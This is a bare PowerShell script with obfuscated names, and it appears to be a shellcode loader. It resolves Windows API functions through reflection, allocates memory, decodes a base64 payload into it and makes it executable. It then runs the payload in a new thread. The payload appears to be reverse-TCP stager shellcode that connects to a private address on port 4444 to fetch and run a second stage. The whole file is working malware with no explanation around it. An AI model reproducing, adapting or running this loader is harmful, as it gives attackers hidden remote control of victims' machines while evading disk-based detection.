function rCD {
        Param ($jk, $fMRGt)
        $tHo = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $tHo.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tHo.GetMethod('GetModuleHandle')).Invoke($null, @($jk)))), $fMRGt))
}

function x9 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $aM,
                [Parameter(Position = 1)] [Type] $x9Fw = [Void]
        )

        $dprk = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $dprk.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aM).SetImplementationFlags('Runtime, Managed')
        $dprk.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $x9Fw, $aM).SetImplementationFlags('Runtime, Managed')

        return $dprk.CreateType()
}

[Byte[]]$gDzSG = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgVkiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKgBbUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1Wi0AAAAQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$hOajj = 0
$da1Mi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rCD kernel32.dll VirtualAlloc), (x9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $gDzSG.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($gDzSG, 0, $da1Mi, $gDzSG.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rCD kernel32.dll VirtualProtect), (x9 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($da1Mi, [Uint32]$gDzSG.Length, 0x10, [Ref]$hOajj)) -eq $true) {
        $t6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rCD kernel32.dll CreateThread), (x9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$da1Mi,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rCD kernel32.dll WaitForSingleObject), (x9 @([IntPtr], [Int32]))).Invoke($t6,0xffffffff) | Out-Null
}
